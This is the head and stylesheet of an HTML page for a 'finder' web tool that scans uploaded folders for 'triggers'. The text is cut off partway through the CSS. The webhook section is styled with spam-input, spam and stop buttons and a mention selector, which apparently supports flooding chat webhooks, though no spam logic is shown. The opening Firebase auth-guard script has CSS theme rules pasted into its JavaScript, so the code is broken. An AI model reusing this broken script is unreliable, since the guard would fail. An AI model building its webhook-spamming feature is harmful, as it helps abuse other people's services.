<!DOCTYPE html><html lang="en"><head>
<!-- Auth guard (added) -->
<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-auth.js";
import { getFirestore, doc, getDoc } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";

const cfg = window.APP_CONFIG;

async function checkForceLogout(app, auth, user){
  try{
    const db = getFirestore(app);
    const snap = await getDoc(doc(db, "users", user.uid));
    if (!snap.exists()) return;
    const u = snap.data() || {};
    const f = u.forceLogoutAt;
    if (!f) return;
    const fMillis = f?.toMillis ? f.toMillis() : null;
    const key = `forceLogoutSeen:${user.uid}`;
    const seen = Number(localStorage.getItem(key) || 0);
    if (fMillis && fMillis > seen){
      localStorage.setItem(key, String(fMillis));
      await signOut(auth);
      alert("You have been logged out by admin.");
      window.location.href = "./index.html";
    }
  }catch(e){
    console.warn("force logout check failed", e);
  }
}


/* ===== Toolbar color themes ===== */
html[data-theme="red"]{ --tb-accent:#ff2a2a; --tb-border:rgba(255,0,0,.22); --tb-badge-bg:rgba(255,0,0,.12); }
html[data-theme="blue"]{ --tb-accent:#3b82f6; --tb-border:rgba(59,130,246,.28); --tb-badge-bg:rgba(59,130,246,.14); }
html[data-theme="purple"]{ --tb-accent:#a855f7; --tb-border:rgba(168,85,247,.28); --tb-badge-bg:rgba(168,85,247,.14); }
html[data-theme="green"]{ --tb-accent:#22c55e; --tb-border:rgba(34,197,94,.28); --tb-badge-bg:rgba(34,197,94,.14); }
html[data-theme="amber"]{ --tb-accent:#f59e0b; --tb-border:rgba(245,158,11,.30); --tb-badge-bg:rgba(245,158,11,.14); }

try{
  const app = initializeApp(cfg.firebase);
  const auth = getAuth(app);

  onAuthStateChanged(auth, async (user)=>{
    if (!user){
      // Avoid false redirects while Firebase restores session
      setTimeout(()=>{ if (!auth.currentUser) window.location.href = "./index.html"; }, 800);
      return;
    }
    await checkForceLogout(app, auth, user);
  });
}catch(e){
  console.warn("Auth guard init failed", e);
}

</script>

<script>
/* ===== Early Detections Panel Opener (stable) ===== */
window.__h89OpenDetectPanel = window.__h89OpenDetectPanel || function(){
 const backdrop = document.getElementById("h89-detect-panel-backdrop");
 const panel = document.getElementById("h89-detect-panel");
 if(backdrop) backdrop.style.display = "block";
 if(panel) panel.style.display = "block";
};
window.__h89CloseDetectPanel = window.__h89CloseDetectPanel || function(){
 const backdrop = document.getElementById("h89-detect-panel-backdrop");
 const panel = document.getElementById("h89-detect-panel");
 if(backdrop) backdrop.style.display = "none";
 if(panel) panel.style.display = "none";
};
</script>

 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Corrected viewport meta tag -->
 <!-- Favicon -->
 <link rel="icon" href="chomik.jpg" type="image/jpeg">
 <title> No name</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<!-- Use Fira Code font -->
 <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&display=swap" rel="stylesheet">
 <!-- Include Font Awesome for icons -->
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 <!-- Enhanced styles -->
 <link rel="stylesheet" href="enhanced-styles.css">
<link rel="stylesheet" href="./styles.css" />
 <style>
 /* Define theme colors */
 :root {
 --bg-color: #0a0a0a;
 --container-bg: rgba(0, 0, 0, 0.5);
 --text-color: #c0c0c0; /* Light gray for general text */
 --primary-color: #d90000; /* Purple */
 --accent-color: #e00303; /* Slightly different purple for accents */
 --border-color: rgba(255, 0, 0, 0.5); /* Purple border */
 --border-radius: 0.4rem; /* 6.4px */
 --font-family: 'Fira Code', monospace;
 --input-bg: #1a1a1a; /* Darker input background */
 }

 /* Basic page styling */
 html, body {
 height: 100%;
 margin: 0;
 padding: 0;
 font-family: var(--font-family);
 background-color: var(--bg-color);
 color: var(--text-color);
 opacity: 0;
 animation: fadeIn 1.5s forwards;
 overflow-x: hidden; /* Prevent horizontal scroll */
 overflow-y: auto; /* Allow vertical scroll if needed */
 }

 /* Add global custom cursor style */
 * {
 cursor: url(jojo/hqizezkx5r.cur/index.html) 0 0, auto !important;
 box-sizing: border-box; /* Include padding and border in element's total width and height */
 }

 /* Video Background */
 #video-bg { /* Use consistent ID */
 position: fixed;
 right: 0;
 bottom: 0;
 min-width: 100%;
 min-height: 100%;
 width: auto;
 height: auto;
 z-index: -10;
 object-fit: cover;
 filter: blur(2px) brightness(100%);
 }

 /* Click to Start Overlay Styles */
 #text-overlay {
 position: fixed;
 top: 0;
 left: 0;
 width: 100%;
 height: 100%;
 background-color: rgba(0, 0, 0, 0.8);
 display: flex;
 justify-content: center;
 align-items: center;
 z-index: 10002;
 cursor: pointer;
 transition: opacity 0.5s ease;
 opacity: 1;
 }
 #text-overlay.hidden {
 opacity: 0;
 pointer-events: none;
 }
 #click-text {
 color: white;
 font-size: 2em;
 font-weight: bold;
 font-family: var(--font-family);
 }

 /* Main content wrapper - centered */
 .main-wrapper {
 display: flex;
 min-height: 100vh;
 padding: 2rem 0 2rem 0; /* Consistent padding */
 width: 100%;
 justify-content: center;
 align-items: center; /* Center vertically */
 }

 /* Main content container - adapted */
 .container {
 max-width: 100%; /* Increased max-width for finder */
 width: 100%;
 margin: 0 auto;
 padding: 0 1rem;
 display: flex;
 flex-direction: column;
 gap: 0.75rem;
 }

 /* General component styling (applied to #finder-app) */
 .component {
 background-color: var(--container-bg);
 border-radius: var(--border-radius);
 border: 1px solid var(--border-color);
 padding: 1.5rem;
 backdrop-filter: blur(5px);
 transition: transform 0.3s ease, box-shadow 0.3s ease;
 width: 100%;
 text-align: center; /* Keep text-align center for the main app container */
 }

 /* Mute button styling */
 #mute-button { /* Use consistent ID */
 position: fixed;
 top: 20px;
 right: 20px;
 background: linear-gradient(135deg, rgba(255, 0, 0, 0.8), rgba(94, 255, 0, 0.8));
 border: 2px solid var(--border-color);
 color: var(--text-color);
 font-size: 1.5rem;
 cursor: url('GTA%205%20Web%20Cursor.cur'), pointer; /* Specific cursor */
 z-index: 1001;
 transition: all 0.3s ease;
 padding: 12px;
 border-radius: 50%;
 width: 60px;
 height: 60px;
 display: flex;
 align-items: center;
 justify-content: center;
 backdrop-filter: blur(10px);
 box-shadow: 0 4px 15px rgba(116, 0, 217, 0.3);
 }

 #mute-button:hover {
 transform: scale(1.1) rotate(5deg);
 background: linear-gradient(135deg, var(--primary-color), var(--accent-color));
 box-shadow: 0 6px 25px rgba(116, 0, 217, 0.5);
 border-color: var(--accent-color);
 }

 #mute-button:active {
 transform: scale(0.95);
 }

 /* Finder Specific Styles - Adapted to Theme */
 h1 {
 font-family: var(--font-family);
 font-size: 1.8em;
 color: var(--primary-color);
 text-shadow: 0 0 5px rgba(116, 0, 217, 0.5);
 margin-bottom: 1rem;
 text-transform: uppercase;
 letter-spacing: 2px;
 white-space: nowrap;
 }

 /* Search and Filter Row */
 .search-filter-row {
 display: flex;
 flex-wrap: wrap; /* Allow wrapping */
 align-items: center;
 gap: 10px;
 margin-bottom: 1rem;
 }

 #search,
 #folder-input { /* Style folder input like search */
 flex: 1;
 padding: 10px;
 background-color: var(--input-bg);
 color: var(--text-color);
 border: 1px solid var(--border-color);
 border-radius: var(--border-radius);
 font-family: var(--font-family);
 min-width: 150px; /* Ensure minimum width */
 }

 #search:focus,
 #folder-input:focus {
 outline: none;
 border-color: var(--accent-color);
 }

 /* Style file input button */
 #folder-input::file-selector-button {
 background-color: var(--primary-color);
 color: white;
 border: none;
 padding: 8px 12px;
 border-radius: var(--border-radius);
 cursor: pointer;
 font-family: var(--font-family);
 transition: filter 0.3s ease;
 margin-right: 10px;
 }
 #folder-input::file-selector-button:hover {
 filter: brightness(1.25);
 }

 /* General Button Styling */
 button {
 padding: 12px 24px;
 background: linear-gradient(135deg, var(--primary-color), var(--accent-color));
 color: white;
 border: 1px solid var(--border-color);
 cursor: pointer;
 border-radius: var(--border-radius);
 font-family: var(--font-family);
 transition: all 0.3s ease;
 font-weight: 600;
 outline: none;
 position: relative;
 overflow: hidden;
 text-transform: uppercase;
 letter-spacing: 0.5px;
 }

 button::before {
 content: '';
 position: absolute;
 top: 50%;
 left: 50%;
 width: 0;
 height: 0;
 background: rgba(255, 255, 255, 0.2);
 border-radius: 50%;
 transform: translate(-50%, -50%);
 transition: width 0.6s, height 0.6s;
 }

 button:hover::before {
 width: 300px;
 height: 300px;
 }

 button:hover {
 transform: translateY(-2px);
 box-shadow: 0 5px 15px rgba(116, 0, 217, 0.4);
 }

 button:disabled {
 background: #555; /* Keep disabled style */
 border-color: #444;
 cursor: not-allowed;
 filter: brightness(0.7);
 transform: none;
 box-shadow: none;
 }

 button:disabled::before {
 display: none;
 }

 /* Dropdown button inherits general button styles */
 .dropdown button {
 min-width: 120px;
 }

 .dropdown-content {
 display: none;
 position: absolute;
 background-color: var(--input-bg); /* Use input background */
 min-width: 180px; /* Adjusted width */
 box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.4);
 padding: 10px;
 z-index: 1002;
 border-radius: var(--border-radius);
 border: 1px solid var(--border-color);
 text-align: left; /* Align labels left */
 }

 .dropdown:hover .dropdown-content {
 display: block;
 }

 .dropdown-content label {
 display: block;
 margin-bottom: 8px;
 color: var(--text-color);
 position: relative;
 font-size: 0.9em;
 cursor: pointer; /* Use default pointer */
 }
 .dropdown-content label input[type="checkbox"] {
 accent-color: var(--primary-color);
 margin-right: 8px;
 cursor: pointer; /* Use default pointer */
 }

 .dropdown-content label:hover .filter-explanation {
 display: block;
 }

 .filter-explanation {
 display: none;
 position: absolute;
 top: 0;
 left: 105%; /* Position slightly to the right */
 background-color: rgba(0, 0, 0, 0.9);
 color: var(--primary-color); /* Purple text */
 padding: 8px 12px;
 border-radius: var(--border-radius);
 font-size: 0.8em;
 font-weight: 600;
 width: 220px;
 z-index: 1003; /* Above dropdown content */
 border: 1px solid var(--border-color);
 white-space: pre-line; /* Allow line breaks */
 }

 /* Fixed Height for Results Container */
 #results-container {
 margin-top: 1rem;
 height: 350px;
 overflow-y: auto;
 border: 1px solid var(--border-color);
 padding: 10px;
 background-color: rgba(0, 0, 0, 0.2); /* Slightly transparent background */
 border-radius: var(--border-radius);
 text-align: left; /* Align trigger text left */
 position: relative;
 }

 /* Custom scrollbar for results container */
 #results-container::-webkit-scrollbar {
 width: 8px;
 }
 #results-container::-webkit-scrollbar-track {
 background: var(--input-bg);
 border-radius: 4px;
 }
 #results-container::-webkit-scrollbar-thumb {
 background: var(--primary-color);
 border-radius: 4px;
 }
 #results-container::-webkit-scrollbar-thumb:hover {
 background: var(--accent-color);
 }

 .trigger {
 background: var(--input-bg); /* Darker background for each item */
 padding: 15px;
 border: 1px solid var(--border-color);
 margin-bottom: 10px;
 border-radius: var(--border-radius);
 transition: all 0.3s ease;
 position: relative;
 overflow: hidden;
 }

 .trigger:hover {
 transform: translateY(-2px);
 box-shadow: 0 5px 15px rgba(116, 0, 217, 0.3);
 border-color: var(--accent-color);
 }

 .trigger::before {
 content: '';
 position: absolute;
 top: 0;
 left: 0;
 right: 0;
 height: 3px;
 background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
 opacity: 0;
 transition: opacity 0.3s ease;
 }

 .trigger:hover::before {
 opacity: 1;
 }

 .trigger .full-trigger {
 color: var(--text-color); /* Regular text color */
 font-weight: bold;
 word-break: break-all; /* Break long trigger names */
 font-family: var(--font-family);
 font-size: 0.95em;
 line-height: 1.4;
 margin-bottom: 8px;
 }

 .trigger .folder {
 color: var(--accent-color); /* Use accent color for folder */
 font-size: 0.85em;
 margin-top: 5px;
 opacity: 0.8;
 display: flex;
 align-items: center;
 gap: 5px;
 }

 .trigger .folder::before {
 content: 'üìÅ';
 font-size: 12px;
 }

 #download-btn {
 margin-top: 1rem;
 }

 .error {
 color: #ff4444;
 margin-top: 10px;
 }

 .success {
 color: #00cc66;
 margin-top: 10px;
 }

 #progress-container {
 width: 100%;
 background-color: var(--input-bg);
 margin-top: 1rem;
 display: none;
 border-radius: var(--border-radius);
 border: 1px solid var(--border-color);
 overflow: hidden; /* Ensure progress bar stays within borders */
 }

 #progress-bar {
 width: 0%;
 height: 25px; /* Slightly smaller height */
 background-color: var(--primary-color);
 text-align: center;
 line-height: 25px;
 color: white;
 border-radius: 0; /* Remove radius from bar itself */
 transition: width 0.3s ease; /* Smooth progress transition */
 }

 .highlight {
 background-color: yellow;
 font-weight: bold;
 color: #000;
 }

 /* Webhook Related Styles - Adapted */
 .webhook-container {
 margin-top: 1rem;
 padding: 15px;
 background: rgba(0, 0, 0, 0.2); /* Match results container background */
 border-radius: var(--border-radius);
 border: 1px solid var(--border-color);
 max-height: 300px;
 overflow-y: auto;
 scrollbar-width: thin;
 scrollbar-color: var(--primary-color) var(--input-bg); /* Themed scrollbar */
 text-align: left; /* Align content left */
 display: none; /* Hidden by default */
 }

 .webhook-container.is-hidden{display:none !important;}
.webhook-container.visible {
 display: block; /* Show when has visible class */
 }

 /* Webkit scrollbar styles */
 .webhook-container::-webkit-scrollbar {
 width: 8px;
 }
 .webhook-container::-webkit-scrollbar-track {
 background: var(--input-bg);
 border-radius: 4px;
 }
 .webhook-container::-webkit-scrollbar-thumb {
 background: var(--primary-color);
 border-radius: 4px;
 }
 .webhook-container::-webkit-scrollbar-thumb:hover {
 background: var(--accent-color);
 }

 .webhook {
 display: grid;
 grid-template-columns: auto 1fr;
 gap: 15px;
 background: var(--input-bg); /* Match trigger item background */
 padding: 15px;
 margin: 10px 0;
 border-radius: var(--border-radius);
 border: 1px solid var(--border-color);
 transition: border-color 0.2s;
 }

 .webhook:hover {
 border-color: var(--accent-color);
 }

 .webhook-avatar {
 width: 40px;
 height: 40px;
 border-radius: 50%;
 }

 .webhook-content {
 display: flex;
 flex-direction: column;
 gap: 10px;
 }

 .webhook-url {
 color: #00ff00; /* Keep green for URLs */
 word-break: break-all;
 font-family: monospace;
 font-size: 0.9em;
 padding: 5px;
 background: rgba(0,0,0,0.3); /* Darker background for URL */
 border-radius: 4px;
 border: 1px solid var(--border-color);
 }

 .webhook-info {
 font-size: 0.9em;
 font-style: italic;
 }
 .webhook-status {
 font-weight: bold;
 }

 .webhook-controls {
 display: flex;
 flex-wrap: wrap;
 gap: 8px;
 align-items: center; /* Align items vertically */
 }

 .webhook-spam-input,
 .mention-tag { /* Style select like input */
 background: var(--input-bg);
 color: var(--text-color);
 border: 1px solid var(--border-color);
 padding: 8px;
 border-radius: var(--border-radius);
 font-family: var(--font-family);
 flex: 1;
 min-width: 150px; /* Minimum width */
 }

 .webhook-spam-input:focus,
 .mention-tag:focus {
 border-color: var(--accent-color);
 outline: none;
 }

 /* Style select dropdown options */
 .mention-tag option {
 background: var(--input-bg);
 color: var(--text-color);
 }

 /* Style webhook buttons smaller */
 .webhook-controls button {
 padding: 8px 16px;
 font-size: 0.9em;
 min-width: 80px;
 }
 .webhook-controls .spam-btn,
 .webhook-controls .stop-btn {
 min-width: 90px; /* Ensure enough space for text/icon */
 }

 /* Fade-in animations */
 @keyframes fadeIn {
 to { opacity: 1; }
 }

 /* Typing effect for messages */
 .typing-effect {
 overflow: hidden;
 border-right: 2px solid var(--primary-color);
 white-space: nowrap;
 animation: typing 3s steps(40, end), blink-caret 0.75s step-end infinite;
 }

 @keyframes typing {
 from { width: 0; }
 to { width: 100%; }
 }

 @keyframes blink-caret {
 from, to { border-color: transparent; }
 50% { border-color: var(--primary-color); }
 }

 /* Enhanced progress bar */
 #progress-bar {
 width: 0%;
 height: 30px;
 background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
 text-align: center;
 line-height: 30px;
 color: white;
 border-radius: 0;
 transition: width 0.3s ease;
 position: relative;
 overflow: hidden;
 }

 #progress-bar::after {
 content: '';
 position: absolute;
 top: 0;
 left: -100%;
 width: 100%;
 height: 100%;
 background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
 animation: shimmer 2s infinite;
 }

 @keyframes shimmer {
 0% { left: -100%; }
 100% { left: 100%; }
 }

 /* Snowflake Styling - Enhanced */
 .snowflake {
 position: fixed;
 top: -10%;
 color: #fff;
 font-size: 1em; /* Use em for scalability */
 user-select: none;
 pointer-events: none;
 animation: fall linear infinite;
 opacity: 0.8;
 z-index: 9998; /* Below overlay/mute, above background */
 text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
 will-change: transform, opacity; /* Performance hint for animations */
 }

 .snowflake.special {
 color: var(--primary-color);
 text-shadow: 0 0 15px var(--primary-color);
 font-size: 1.5em;
 }

 @keyframes fall {
 0% {
 transform: translateY(0) rotate(0deg);
 opacity: 0.8;
 }
 100% {
 transform: translateY(110vh) rotate(360deg);
 opacity: 0;
 }
 }

 /* Pulse animation for special elements */
 @keyframes pulse {
 0%, 100% {
 opacity: 1;
 transform: scale(1);
 }
 50% {
 opacity: 0.7;
 transform: scale(1.05);
 }
 }

 /* Add glowing effect to main title */
 h1 {
 font-family: var(--font-family);
 font-size: 1.8em;
 color: var(--primary-color);
 text-shadow: 0 0 20px rgba(116, 0, 217, 0.8), 0 0 40px rgba(116, 0, 217, 0.4);
 margin-bottom: 1rem;
 text-transform: uppercase;
 letter-spacing: 2px;
 white-space: nowrap;
 animation: pulse 3s ease-in-out infinite;
 }

 /* Stats display */
 .stats-container {
 display: flex;
 justify-content: space-around;
 margin: 1rem 0;
 padding: 1rem;
 background: rgba(116, 0, 217, 0.1);
 border-radius: var(--border-radius);
 border: 1px solid var(--border-color);
 }

 .stat-item {
 text-align: center;
 color: var(--text-color);
 }

 .stat-number {
 font-size: 1.5em;
 font-weight: bold;
 color: var(--primary-color);
 display: block;
 }

 .stat-label {
 font-size: 0.8em;
 opacity: 0.8;
 text-transform: uppercase;
 letter-spacing: 1px;
 }

 /* Enhanced search input */
 #search,
 #folder-input {
 flex: 1;
 padding: 12px 16px;
 background-color: var(--input-bg);
 color: var(--text-color);
 border: 1px solid var(--border-color);
 border-radius: var(--border-radius);
 font-family: var(--font-family);
 min-width: 150px;
 transition: all 0.3s ease;
 position: relative;
 }

 #search:focus,
 #folder-input:focus {
 outline: none;
 border-color: var(--accent-color);
 box-shadow: 0 0 15px rgba(116, 0, 217, 0.3);
 transform: translateY(-1px);
 }

 /* Loading animation */
 .loading {
 display: inline-block;
 width: 20px;
 height: 20px;
 border: 3px solid rgba(116, 0, 217, 0.3);
 border-radius: 50%;
 border-top-color: var(--primary-color);
 animation: spin 1s ease-in-out infinite;
 }

 @keyframes spin {
 to { transform: rotate(360deg); }
 }

 /* ===== H89 ADVANCED UI (non-breaking override) ===== */
 .main-wrapper{padding-top:18px}
 #finder-app.component{position:relative}
 .h89-toolbar{
 position:sticky; top:10px; z-index:20;
 display:flex; align-items:center; justify-content:space-between; gap:12px;
 margin: 0 0 14px 0;
 padding: 12px 14px;
 border-radius: 16px;
 background: var(--tb-bg, rgba(0,0,0,.45));
 border: 1px solid var(--tb-border, rgba(255,0,0,.20));
 box-shadow: var(--tb-shadow, 0 18px 55px rgba(0,0,0,.65));
 backdrop-filter: blur(10px);
 }
 .h89-toolbar-left{display:flex; align-items:center; gap:10px; flex-wrap:wrap}

 .h89-toolbar-right{display:flex; align-items:center; gap:10px; flex-wrap:wrap; justify-content:flex-end}
 .h89-theme-select{
   height:38px;
   padding: 0 12px;
   border-radius: 12px;
   border: 1px solid var(--tb-border, rgba(255,0,0,.22));
   background: rgba(12,12,12,.55);
   color:#fff;
   outline:none;
   cursor:pointer;
 }
 .h89-theme-select:hover{ filter: brightness(1.06); }
 .h89-theme-dot{
   width:10px; height:10px; border-radius:999px; background: var(--tb-accent);
   display:inline-block; margin-right:8px;
 }

 .h89-badge{
 width:38px; height:38px; border-radius:12px;
 display:grid; place-items:center;
 background: var(--tb-badge-bg, rgba(255,0,0,.12));
 border: 1px solid var(--tb-badge-border, rgba(255,0,0,.35));
 color:#ff2a2a; font-weight:900; letter-spacing:1px;
 box-shadow: 0 0 0 2px rgba(255,0,0,.06) inset;
 }
 .h89-toolbar-title{font-weight:800; letter-spacing:1px}
 .h89-toolbar-sub{opacity:.75; font-size:12px}
 .h89-toolbar-actions{display:flex; gap:10px; flex-wrap:wrap}
 .h89-tbtn{
 padding:10px 12px; border-radius:12px;
 background: rgba(255,255,255,.06);
 border: 1px solid rgba(255,255,255,.12);
 color: #fff; cursor:pointer;
 font-family: var(--font-family);
 transition: transform .15s ease, border-color .15s ease, background .15s ease;
 }
 .h89-tbtn:hover{transform: translateY(-1px); border-color: rgba(255,0,0,.35)}
 
 .h89-tbtn.is-active{background: rgba(255,0,0,.18); border-color: rgba(255,0,0,.9); box-shadow: 0 0 0 1px rgba(255,0,0,.25) inset;}
.h89-tbtn:active{transform: translateY(0px)}
 .h89-primary{background: rgba(255,0,0,.16); border-color: rgba(255,0,0,.50)}
 /* Make stats look more premium */
 .stats-container{
 gap:10px;
 background: rgba(0,0,0,.22) !important;
 border-color: rgba(255,0,0,.20) !important;
 backdrop-filter: blur(6px);
 }
 .stat-item{
 padding: 10px 10px;
 border-radius: 14px;
 border: 1px solid rgba(255,255,255,.10);
 background: rgba(255,255,255,.04);
 min-width: 120px;
 }
 .stat-number{filter: drop-shadow(0 0 10px rgba(255,0,0,.18))}
 /* Results panel feel */
 #results, #output, .results, .output{
 border-radius: 18px !important;
 background: rgba(0,0,0,.28) !important;
 border: 1px solid rgba(255,0,0,.18) !important;
 box-shadow: 0 18px 60px rgba(0,0,0,.65);
 backdrop-filter: blur(8px);
 }
 /* Small responsive tweak */
 @media (max-width: 720px){
 .h89-toolbar{position:relative; top:auto}
 .h89-toolbar-actions{width:100%}
 .h89-tbtn{flex:1}
 .stat-item{min-width:auto; flex:1}
 }

 /* ===== H89 SIDEBAR + THEMES ===== */
 .h89-shell{width:min(1280px,96vw); display:grid; grid-template-columns: 320px 1fr; gap:14px; align-items:start}
 .h89-main{min-width:0}
 .h89-side{
 position:sticky; top:14px; align-self:start;
 background: rgba(0,0,0,.45);
 border: 1px solid rgba(255,0,0,.20);
 border-radius: 18px;
 box-shadow: 0 22px 70px rgba(0,0,0,.70);
 backdrop-filter: blur(10px);
 padding: 14px;
 max-height: calc(100vh - 28px);
 overflow:auto;
 }
 .h89-side-head{display:flex; align-items:center; gap:10px; margin-bottom:12px}
 .h89-side-logo{
 width:42px;height:42px;border-radius:14px;
 display:grid;place-items:center;
 background: rgba(255,0,0,.12);
 border:1px solid rgba(255,0,0,.35);
 color:#ff2a2a;font-weight:900;letter-spacing:1px;
 }
 .h89-side-title{font-weight:900; letter-spacing:1px}
 .h89-side-sub{opacity:.75; font-size:12px}
 .h89-side-toggle{
 margin-left:auto;
 width:40px;height:40px;border-radius:14px;
 background: rgba(255,255,255,.06);
 border:1px solid rgba(255,255,255,.12);
 color:#fff; cursor:pointer;
 }
 .h89-side-block{padding:12px; border-radius:16px; border:1px solid rgba(255,255,255,.10); background: rgba(255,255,255,.03); margin-bottom:12px}
 .h89-side-label{font-size:12px; opacity:.8; margin-bottom:8px}
 .h89-side-row{display:flex; gap:8px; align-items:center}
 .h89-side-row input{
 flex:1;
 padding:10px 10px; border-radius:12px;
 background: rgba(0,0,0,.25);
 border:1px solid rgba(255,255,255,.12);
 color:#fff;
 outline:none;
 font-family: var(--font-family);
 }
 .h89-mini{
 padding:10px 12px; border-radius:12px;
 background: rgba(255,0,0,.14);
 border:1px solid rgba(255,0,0,.45);
 color:#fff; cursor:pointer;
 font-family: var(--font-family);
 white-space:nowrap;
 }
 .h89-mini-muted{opacity:.75; font-size:12px; margin-left:auto}
 .h89-theme-row{display:flex; gap:8px}
 .h89-pillbtn{
 flex:1;
 padding:10px 12px;
 border-radius: 999px;
 background: rgba(255,255,255,.06);
 border:1px solid rgba(255,255,255,.12);
 color:#fff;
 cursor:pointer;
 font-family: var(--font-family);
 }
 .h89-pillbtn.active{background: rgba(255,0,0,.18); border-color: rgba(255,0,0,.50)}
 .h89-list{display:flex; flex-direction:column; gap:8px; margin-top:10px}
 .h89-item{
 padding:10px 10px; border-radius:14px;
 background: rgba(0,0,0,.20);
 border:1px solid rgba(255,255,255,.10);
 cursor:pointer;
 display:flex; align-items:center; justify-content:space-between; gap:10px;
 }
 .h89-item:hover{border-color: rgba(255,0,0,.35)}
 .h89-item b{font-size:12px}
 .h89-item span{font-size:11px; opacity:.75; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; max-width: 210px}
 .h89-x{width:28px;height:28px;border-radius:10px; background: rgba(255,80,80,.12); border:1px solid rgba(255,80,80,.45); color:#fff; cursor:pointer}
 .h89-side-foot{opacity:.8; font-size:11px; padding:4px 2px}

 /* Collapse */
 .h89-shell.side-collapsed{grid-template-columns: 72px 1fr}
 .h89-shell.side-collapsed .h89-side{padding:10px}
 .h89-shell.side-collapsed .h89-side-title,
 .h89-shell.side-collapsed .h89-side-sub,
 .h89-shell.side-collapsed .h89-side-block,
 .h89-shell.side-collapsed .h89-side-foot{display:none}
 .h89-shell.side-collapsed .h89-side-head{justify-content:center}
 .h89-shell.side-collapsed .h89-side-toggle{margin-left:0}

 /* Neon theme (toggle via [data-theme="neon"]) */
 body[data-theme="neon"]{
 background:
 radial-gradient(900px 500px at 15% 15%, rgba(0,220,255,.12), transparent 60%),
 radial-gradient(900px 520px at 85% 75%, rgba(255,0,200,.14), transparent 55%),
 #060607;
 }
 body[data-theme="neon"] .h89-badge,
 body[data-theme="neon"] .h89-side-logo{
 background: rgba(0,220,255,.10);
 border-color: rgba(0,220,255,.35);
 color: #64f7ff;
 }
 body[data-theme="neon"] .h89-primary,
 body[data-theme="neon"] .btn-login,
 body[data-theme="neon"] .btn-create{
 background: rgba(0,220,255,.12) !important;
 border-color: rgba(0,220,255,.45) !important;
 }
 body[data-theme="neon"] .h89-toolbar,
 body[data-theme="neon"] .h89-side{
 border-color: rgba(0,220,255,.18);
 }
 body[data-theme="neon"] .h89-tbtn:hover,
 body[data-theme="neon"] .h89-item:hover{
 border-color: rgba(0,220,255,.35);
 }

 @media (max-width: 980px){
 .h89-shell{grid-template-columns: 1fr}
 .h89-side{position:relative; top:auto; max-height:none}
 }

 /* ===== LOADING SPINNER + SPEED ===== */
 .scan-loading{
 display:flex;
 align-items:center;
 gap:14px;
 margin: 12px 0 0 0;
 padding: 12px 14px;
 border-radius: 16px;
 background: rgba(0,0,0,.35);
 border: 1px solid rgba(255,0,0,.18);
 backdrop-filter: blur(8px);
 }
 .scan-title{font-weight:800; letter-spacing:1px}
 .scan-meta{opacity:.8; font-size:12px; margin-top:2px}
 .hidden{display:none !important;}

 .loader {
 font-size: 10px;
 width: 1em;
 height: 1em;
 border-radius: 50%;
 position: relative;
 text-indent: -9999em;
 animation: mulShdSpin 1.1s infinite ease;
 transform: translateZ(0);
 }
 @keyframes mulShdSpin {
 0%, 100% {
 box-shadow: 0em -2.6em 0em 0em #ffffff,
 1.8em -1.8em 0 0em rgba(255,255,255, 0.2),
 2.5em 0em 0 0em rgba(255,255,255, 0.2),
 1.75em 1.75em 0 0em rgba(255,255,255, 0.2),
 0em 2.5em 0 0em rgba(255,255,255, 0.2),
 -1.8em 1.8em 0 0em rgba(255,255,255, 0.2),
 -2.6em 0em 0 0em rgba(255,255,255, 0.5),
 -1.8em -1.8em 0 0em rgba(255,255,255, 0.7);
 }
 12.5% {
 box-shadow: 0em -2.6em 0em 0em rgba(255,255,255, 0.7),
 1.8em -1.8em 0 0em #ffffff,
 2.5em 0em 0 0em rgba(255,255,255, 0.2),
 1.75em 1.75em 0 0em rgba(255,255,255, 0.2),
 0em 2.5em 0 0em rgba(255,255,255, 0.2),
 -1.8em 1.8em 0 0em rgba(255,255,255, 0.2),
 -2.6em 0em 0 0em rgba(255,255,255, 0.2),
 -1.8em -1.8em 0 0em rgba(255,255,255, 0.5);
 }
 25% {
 box-shadow: 0em -2.6em 0em 0em rgba(255,255,255, 0.5),
 1.8em -1.8em 0 0em rgba(255,255,255, 0.7),
 2.5em 0em 0 0em #ffffff,
 1.75em 1.75em 0 0em rgba(255,255,255, 0.2),
 0em 2.5em 0 0em rgba(255,255,255, 0.2),
 -1.8em 1.8em 0 0em rgba(255,255,255, 0.2),
 -2.6em 0em 0 0em rgba(255,255,255, 0.2),
 -1.8em -1.8em 0 0em rgba(255,255,255, 0.2);
 }
 37.5% {
 box-shadow: 0em -2.6em 0em 0em rgba(255,255,255, 0.2),
 1.8em -1.8em 0 0em rgba(255,255,255, 0.5),
 2.5em 0em 0 0em rgba(255,255,255, 0.7),
 1.75em 1.75em 0 0em #ffffff,
 0em 2.5em 0 0em rgba(255,255,255, 0.2),
 -1.8em 1.8em 0 0em rgba(255,255,255, 0.2),
 -2.6em 0em 0 0em rgba(255,255,255, 0.2),
 -1.8em -1.8em 0 0em rgba(255,255,255, 0.2);
 }
 50% {
 box-shadow: 0em -2.6em 0em 0em rgba(255,255,255, 0.2),
 1.8em -1.8em 0 0em rgba(255,255,255, 0.2),
 2.5em 0em 0 0em rgba(255,255,255, 0.5),
 1.75em 1.75em 0 0em rgba(255,255,255, 0.7),
 0em 2.5em 0 0em #ffffff,
 -1.8em 1.8em 0 0em rgba(255,255,255, 0.2),
 -2.6em 0em 0 0em rgba(255,255,255, 0.2),
 -1.8em -1.8em 0 0em rgba(255,255,255, 0.2);
 }
 62.5% {
 box-shadow: 0em -2.6em 0em 0em rgba(255,255,255, 0.2),
 1.8em -1.8em 0 0em rgba(255,255,255, 0.2),
